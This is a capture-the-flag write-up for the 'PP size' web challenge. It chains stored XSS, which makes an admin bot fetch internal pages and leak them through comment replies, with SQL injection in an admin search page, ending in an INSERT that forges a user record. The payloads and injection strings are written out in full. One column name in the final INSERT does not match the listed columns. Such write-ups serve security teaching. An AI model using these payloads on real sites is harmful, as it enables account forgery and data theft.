# Web - PP size

### Description
Let's measure each other's PP and conquer the ultimate PP size championship.
Reach at least 1337.1 centimeters in PP length to get the flag.

Note: Initial PP size is random and cannot exceed 20.

### Playing with service

Upon registration, a comments section becomes visible, 
allowing us to submit posts. After posting a comment and refreshing 
the page, we can view the administrator's reply, along with a clue 
indicating that the admin bot has access only to localhost. 
This is an opportunity to experiment with potential XSS 
(Cross-Site Scripting) vulnerabilities. 
Let's try posting some funny xss code to see
if it affects the system or administrator's response:
```html
<script>alert(1)</script>
```

This works, so it's a XSS challenge, let's try to download the page from admin point of view using `/reply/:id`

```html
<script>
const text = document.body.innerHTML.replaceAll(' ', '').replaceAll('\n', '');
for(let i = 0; i < text.length; i+=200)
fetch(window.location.pathname.replace("comment", "reply"), {method: "POST",body: "message=" + encodeURIComponent(btoa(btoa(
    text.slice(i,i+200)
))),headers: {"Content-Type": "application/x-www-form-urlencoded"}})
</script>
```

This one is interesting: `<a href="/search">Search</a>`, 
let's try getting it

```html
<script>
fetch('/search').then(resp => resp.text()).then(t => {
const text = t.replaceAll(' ', '').replaceAll('\n', '');
for(let i = 0; i < text.length; i+=200)
fetch(window.location.pathname.replace("comment", "reply"), {method: "POST",body: "message=" + encodeURIComponent(btoa(btoa(
    text.slice(i,i+200)
))),headers: {"Content-Type": "application/x-www-form-urlencoded"}})
)
});
</script>
```

The page involves submitting a username via a POST request to the 
/search endpoint. Since some individuals frequently overlook security 
measures in their admin dashboards, it's crucial to initially assess
for potential vulnerabilities like SQL injection. To test this, we'll 
attempt to submit the username '"/ and observe the system's response.
```html
<script>
fetch("/search", {
method: "POST",
body: "query=" + encodeURIComponent("'\"/"),
headers: {"Content-Type": "application/x-www-form-urlencoded"}})
.then(e => e.text()).then(t => {
const text = t.replaceAll(' ', '').replaceAll('\n', '');
for(let i = 0; i < text.length; i+=200)
fetch(window.location.pathname.replace("comment", "reply"), {method: "POST",body: "message=" + encodeURIComponent(btoa(btoa(
        text.slice(i,i+200)
))),headers: {"Content-Type": "application/x-www-form-urlencoded"}})
})
</script>
```


Once we receive an SQL error, we can be fairly certain that an 
SQL injection vulnerability exists. This is our cue to start 
gathering more information about the database system.

### Listing Tables:

To retrieve the names of all tables, we use this SQL query:
```sql
>>> and 1=0 union select table_name from information_schema.tables;--
```

The system responds with the names of several tables:
```
<<< users, insertion_memo, etc...
```

### Listing Columns for a Specific Table (e.g., 'users'):

To get the column names for the 'users' table, the following query is used:

```sql
>>> ' and 1=0 union select column_name from information_schema.columns where table_name = 'users';--
```

This yields the following column names for the 'users' table:

```sql
<<< username, password, pp_size, id
```

### Identifying User Permissions:

To determine the current database user, we run this query:

```sql
>>> ' and 1=0 union select current_user;--
```

The system responds with the current user:

```sql
<<< dummy
```

Next, we want to understand the user’s permissions on each table. Here's how we do it:
```sql
>>> ' and 1=0 union select 'table: ' || table_name || ', priv: ' || privilege_type;--
```

This query reveals the following permissions:

```sql
<<< table: users, priv: INSERT
<<< table users, priv SELECT
<<< table insertion_memo, priv INSERT # this is not interesting, used only for cleanup
```

From this information, we can identify potential targets and the 
risk level associated with each table and permission. 
Now that we have confirmation of our ability to insert a new record 
into the 'users' table, along with the exact column names, 
let's proceed with the exploitation.

### Inserting a New User into 'users' Table

Using the following SQL statement, we insert a new user into the 'users' table:

```sql
>>> ' OR 1 = 1; INSERT INTO users(username, password, pp_length) VALUES('es3n1n', '123', 1338);--
```

### Logging In with the New User

With the insertion successful, we can now log in using the newly created credentials. 
For the username, use `es3n1n`, and for the password, use `123` (common es3n1n's password btw).

```py
import requests

HOST = "localhost:1337"

s = requests.session()

s.post(f'http://{HOST}/login', data={
    'login': 'es3n1n',
    'password': '313233' # note it's hex encoded
})

r = s.get(f'http://{HOST}/login')
print(r.text)
```

### Flag
`cr3{th3_ult1m4t3_p3e_pe3}`
